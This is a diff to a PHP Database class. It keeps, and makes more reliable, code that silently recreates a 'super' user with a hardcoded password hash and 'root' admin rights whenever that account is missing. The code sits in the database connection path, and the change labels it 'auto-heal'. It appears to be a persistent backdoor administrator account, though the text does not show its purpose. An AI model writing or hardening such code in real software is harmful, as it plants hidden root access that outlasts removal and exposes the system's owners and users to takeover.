@@ -50,16 +50,17 @@ class Database {
                 $checkSuper = $this->connection->query("SELECT id FROM users WHERE username = 'super'");
                 if ($checkSuper && $checkSuper->rowCount() === 0) {
                     $this->connection->exec("
-                        INSERT INTO users (id, username, email, phone, password_hash, status) 
-                        VALUES (3, 'super', 'super@gsmsecurity.local', '+12345678903', '$2y$10$nJDIIvtHNOt.jXjZhenRoepyWNwCLV9anPuAfd1GnbzKxflzrAE/m', 'active')
+                        INSERT INTO users (username, email, phone, password_hash, status) 
+                        VALUES ('super', 'super@gsmsecurity.local', '+12345678903', '$2y$10$nJDIIvtHNOt.jXjZhenRoepyWNwCLV9anPuAfd1GnbzKxflzrAE/m', 'active')
                     ");
+                    $newId = $this->connection->lastInsertId();
                     $this->connection->exec("
                         INSERT INTO admins (user_id, access_level) 
-                        VALUES (3, 'root')
+                        VALUES ({$newId}, 'root')
                     ");
                 }
             } catch (\Exception $ex) {
-                // Silently ignore if table doesn't exist yet
+                error_log("Auto-heal super user creation failed: " . $ex->getMessage());
             }
         } catch (PDOException $e) {
             // Log connection failure securely and fail gracefully without disclosing credentials
